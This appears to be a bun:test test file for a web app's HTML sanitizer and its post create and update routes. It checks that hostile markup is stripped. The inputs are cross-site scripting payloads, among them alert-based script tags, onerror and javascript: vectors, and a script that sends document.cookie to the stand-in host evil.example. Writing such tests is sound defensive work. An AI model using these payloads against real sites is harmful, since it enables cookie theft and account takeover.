// SPDX-License-Identifier: AGPL-3.0-or-later
import { describe, expect, it } from "bun:test";
import app from "../index";
import { sanitizePostHtml } from "../services/sanitize";

const testFetch = app.fetch;

function makeRequest(path: string, options?: RequestInit) {
	return testFetch(new Request(`http://localhost${path}`, options));
}

describe("sanitizePostHtml", () => {
	it("strips script tags entirely", () => {
		const out = sanitizePostHtml("<p>hi</p><script>alert(1)</script>");
		expect(out).toContain("<p>hi</p>");
		expect(out).not.toContain("script");
		expect(out).not.toContain("alert");
	});

	it("strips event-handler attributes", () => {
		const out = sanitizePostHtml('<img src="/api/content/images/x.png" onerror="alert(1)">');
		expect(out).toContain("src");
		expect(out).not.toContain("onerror");
	});

	it("strips javascript: URLs from links", () => {
		const out = sanitizePostHtml('<a href="javascript:alert(1)">click</a>');
		expect(out).not.toContain("javascript:");
		expect(out).toContain("click");
	});

	it("strips data: URLs from images", () => {
		const out = sanitizePostHtml('<img src="data:text/html;base64,PHNjcmlwdD4=">');
		expect(out).not.toContain("data:");
	});

	it("discards iframe, style, and form elements", () => {
		const out = sanitizePostHtml(
			'<iframe src="https://evil.example"></iframe><style>*{display:none}</style><form action="/x"><input></form><p>ok</p>',
		);
		expect(out).not.toContain("iframe");
		expect(out).not.toContain("style");
		expect(out).not.toContain("form");
		expect(out).not.toContain("input");
		expect(out).toContain("<p>ok</p>");
	});

	it("strips style attributes and unknown classes", () => {
		const out = sanitizePostHtml(
			'<p style="position:fixed">x</p><a class="link evil-class" href="https://a.example">y</a>',
		);
		expect(out).not.toContain("style=");
		expect(out).not.toContain("evil-class");
		expect(out).toContain('class="link"');
	});

	it("preserves the TipTap vocabulary", () => {
		const input =
			"<h2>Title</h2><p>Hello <strong>world</strong> <em>em</em> <s>gone</s></p>" +
			'<ul><li>a</li><li>b</li></ul><ol start="3"><li>c</li></ol>' +
			"<blockquote><p>quote</p></blockquote><hr>" +
			'<pre><code class="language-ts">let x = 1;</code></pre>' +
			'<img src="/api/content/images/pic.png" alt="pic">';
		const out = sanitizePostHtml(input);
		for (const fragment of [
			"<h2>Title</h2>",
			"<strong>world</strong>",
			"<em>em</em>",
			"<s>gone</s>",
			"<li>a</li>",
			'<ol start="3">',
			"<blockquote>",
			"<hr",
			'<code class="language-ts">',
			'src="/api/content/images/pic.png"',
		]) {
			expect(out).toContain(fragment);
		}
	});

	it("hardens rel on target=_blank links regardless of client input", () => {
		const out = sanitizePostHtml('<a href="https://a.example" target="_blank" rel="opener">x</a>');
		expect(out).toContain('rel="noopener noreferrer nofollow"');
	});

	it("passes through empty input", () => {
		expect(sanitizePostHtml("")).toBe("");
	});
});

describe("post routes sanitize bodyHtml end to end", () => {
	const testId = crypto.randomUUID().slice(0, 8);
	const hostile =
		'<p>legit</p><script>document.location="https://evil.example/"+document.cookie</script>' +
		'<img src="x" onerror="alert(1)">';

	async function signUpAndGetCookie(): Promise<string> {
		const res = await makeRequest("/api/auth/sign-up", {
			method: "POST",
			headers: { "Content-Type": "application/json", Origin: "http://localhost:3000" },
			body: JSON.stringify({
				username: `xss_${testId}`,
				email: `xss_${testId}@example.com`,
				password: "testpass123",
				acceptTerms: true,
			}),
		});
		expect(res.status).toBe(201);
		return res.headers.get("Set-Cookie")!.split(";")[0];
	}

	it("stores sanitized HTML on create and update", async () => {
		const cookie = await signUpAndGetCookie();

		// Create with a hostile payload
		const createRes = await makeRequest("/api/content/posts", {
			method: "POST",
			headers: {
				"Content-Type": "application/json",
				Origin: "http://localhost:3000",
				Cookie: cookie,
			},
			body: JSON.stringify({
				title: `XSS probe ${testId}`,
				body: "legit",
				bodyHtml: hostile,
				contentType: "text",
				isPublished: true,
			}),
		});
		expect(createRes.status).toBe(201);
		const created = await createRes.json();
		expect(created.post.bodyHtml).toContain("<p>legit</p>");
		expect(created.post.bodyHtml).not.toContain("script");
		expect(created.post.bodyHtml).not.toContain("onerror");

		// Read back — stored value must be clean too
		const getRes = await makeRequest(`/api/content/posts/${created.post.slug}`, {
			headers: { Cookie: cookie },
		});
		expect(getRes.status).toBe(200);
		const fetched = await getRes.json();
		expect(fetched.post.bodyHtml).not.toContain("script");
		expect(fetched.post.bodyHtml).not.toContain("onerror");

		// Update with another hostile payload
		const patchRes = await makeRequest(`/api/content/posts/${created.post.slug}`, {
			method: "PATCH",
			headers: {
				"Content-Type": "application/json",
				Origin: "http://localhost:3000",
				Cookie: cookie,
			},
			body: JSON.stringify({
				bodyHtml:
					'<p>updated</p><a href="javascript:alert(1)">x</a><iframe src="https://evil.example"></iframe>',
			}),
		});
		expect(patchRes.status).toBe(200);
		const patched = await patchRes.json();
		expect(patched.post.bodyHtml).toContain("<p>updated</p>");
		expect(patched.post.bodyHtml).not.toContain("javascript:");
		expect(patched.post.bodyHtml).not.toContain("iframe");
	});
});
